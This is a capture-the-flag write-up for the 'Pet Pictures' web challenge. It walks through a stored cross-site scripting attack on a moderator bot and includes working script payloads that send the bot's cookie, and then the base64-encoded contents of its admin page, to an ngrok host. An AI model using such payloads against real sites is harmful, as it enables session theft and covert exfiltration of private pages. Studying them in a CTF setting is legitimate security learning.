# Pet Pictures

## Question

> The moderator of your favorite pet picture sharing website has taken a vacation and left a bot to monitor the site. Unfortunately the bot seems to think it's running a cat blog and won't approve a picture of your turtle. Login as the moderator and approve your photo.  
> Connect to this challenge at http://pwn.osucyber.club:13378  

## Solution (by WCSC)

Wow, this is a cool challenge. I've done lots of XSS attacks, and read about this style, but never needed to perform one. This is definitely up there as one of my top 10 challenges.

Visiting the challenge url, http://pwn.osucyber.club:13378/, you are presented with Pet Pictures, a website for uploading pictures of your pets. Right off the bat, this challenge REEKS of cross-site scripting. In the top right, you can choose to submit a picture, and there is a big "Moderator" button. Any time I see a moderator on a challenge, I automatically assume I'll need to get the moderator to run some JS, and that's no different here.

To grab the cookies (because I assume we will want the moderator's cookies), we will want to use ngrok. If you haven't used ngrok, it is a wonderful tool that provides a public URL that other's can use to connect to your machine. For this challenge, you don't need a web server running, as we will store the information in the URL. After firing up ngrok, I went to the submission page and placed the following code in all of the input fields:
```
<script>
document.write('<img src="http://da42d2740672.ngrok.io/collect.gif?cookie=' + document.cookie + '" />')
</script>
```
This js appends the cookie to the ngrok URL, then places the img in the document to be loaded by the browser. I pulled up the ngrok terminal, and waited a few seconds, and poof! A request came in from the moderator. The cookie, however, was not there.

I poked around a bit and noticed the session cookie for this CTF is httponly! That means that the JS cannot retrieve it, it is only sent as part of an HTTP request. However, we did get code to run as the moderator. Instead of logging in, maybe we can just make the moderator do what we want as a proxy. I wasn't sure exactly what we needed to do, but clicking the moderator button brings up the url http://pwn.osucyber.club:13378/login?next=%2Fadmin. That next parameter with admin means there is an admin page at http://pwn.osucyber.club:13378/admin and I wanted to see what was at that URL.

To do so, I modified the script to have the moderator load this page, and send the results back to my ngrok page instead of the cookie. The script I injected was:
```
<script>
    var req = new XMLHttpRequest();   
    req.open('GET', 'http://pwn.osucyber.club:13378/admin', false);    
    req.send(null);   
    if(true) { 	
        console.log("HERE!"); 
        url = "	http://0c9e37513664.ngrok.io/collect.gif?cookie=";     
        result = req.responseText; 	
        url = url.concat(window.btoa(result));   
        document.write("<img src='" + url + "'></img>"); 
    }
</script>
```
Similar to the previous script, this visits the admin page, concatenates the base64ed result with the ngrok url, then sends the result back to ngrok. Opening the ngrok terminal, we find the base64 encoded admin page.
```
PCFkb2N0eXBlIGh0bWw CjxodG1sIGxhbmc9ImVuLVVTIj4KICA8aGVhZD4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iaHR0cHM6Ly9jZG5qcy5jbG91ZGZsYXJlLmNvbS9hamF4L2xpYnMvbWF0ZXJpYWxpemUvMS4wLjAvY3NzL21hdGVyaWFsaXplLm1pbi5jc3MiPgogICAgPHNjcmlwdCBzcmM9Imh0dHBzOi8vY2RuanMuY2xvdWRmbGFyZS5jb20vYWpheC9saWJzL21hdGVyaWFsaXplLzEuMC4wL2pzL21hdGVyaWFsaXplLm1pbi5qcyI PC9zY3JpcHQ CiAgICA8bGluayBocmVmPSJodHRwczovL2ZvbnRzLmdvb2dsZWFwaXMuY29tL2ljb24/ZmFtaWx5PU1hdGVyaWFsK0ljb25zIiByZWw9InN0eWxlc2hlZXQiPgoKICAgIAogICAgPHRpdGxlPkFkbWluPC90aXRsZT4KICAgIAogIDwvaGVhZD4KICA8Ym9keT4KICA8ZGl2IGNsYXNzPSJuYXZiYXItZml4ZWQiPgogICAgPG5hdj4KICAgICAgPGRpdiBjbGFzcz0ibmF2LXdyYXBwZXIiPgogICAgICAgIDxhIGhyZWY9Ii8iIGNsYXNzPSJicmFuZC1sb2dvIGNlbnRlciI PGkgY2xhc3M9Im1hdGVyaWFsLWljb25zIj5wZXRzPC9pPlBldFBpY3R1cmVzPC9hPgogICAgICAgIDx1bCBjbGFzcz0icmlnaHQiPgogICAgICAgICAgPGxpPjxhIGhyZWY9Ii9zdWJtaXQiPlN1Ym1pdDwvYT48L2xpPgogICAgICAgICAgCiAgICAgICAgICA8bGk PGEgaHJlZj0iL2xvZ291dCI TG9nb3V0PC9hPjwvbGk CiAgICAgICAgICAKICAgICAgICA8L3VsPgogICAgICA8L2Rpdj4KICAgIDwvbmF2PgogICAgCiAgICAgIAogICAgCiAgPC9kaXY CgogIAo8ZGl2IGNsYXNzPSJjb250YWluZXIiPgogICAgCiAgICA8ZGl2IGNsYXNzPSJyb3ciPgogICAgICAgIDxkaXYgY2xhc3M9ImNvbCBzMTIiPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJjYXJkLXBhbmVsIGdyZXkgbGlnaHRlbi0yIj4KICAgICAgICAgICAgICAgIDxzcGFuPlBlbmRpbmcgQXBwcm92YWw6IDI8L3NwYW4 CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgIDwvZGl2PgogICAgPC9kaXY CiAgICAKICAgIDxkaXYgY2xhc3M9InJvdyI CiAgICAgICAgPGRpdiBjbGFzcz0iY2FyZCBob3Jpem9udGFsIj4KICAgICAgICAgICAgPGRpdiBjbGFzcz0iY2FyZC1pbWFnZSI CiAgICAgICAgICAgICAgICA8aW1nIHNyYz0iL3VwbG9hZC8yZjRkZDEyZjgwZTY4OTFkY2M3Mzc2ZDVkMjlmM2FiOGRiYjg2NWUyIiBhbHQ9ImNseWRlIi8 CiAgICAgICAgICAgICAgICA8YSBjbGFzcz0iY2FyZC10aXRsZSI Q2x5ZGU8L2E CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJjYXJkLWNvbnRlbnQiPgogICAgICAgICAgICAgICAgPHA TW9kZXJhdG9yIE1lc3NhZ2U6IG9zdWN0ZntuM1YzUl83UnU1VF91czNyXzFOUFU3fTwvcD4KICAgICAgICAgICAgICAgIDxwPlN1Ym1pdHRlZCBCeTogV2F0c29uPC9wPgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICA8L2Rpdj4KICAgIDwvZGl2PgogICAgCjwvZGl2PgoKICA8L2JvZHk CjwvaHRtbD4=
```
Decoding that gives the admin page, which contains the flag. Pretty awesome!

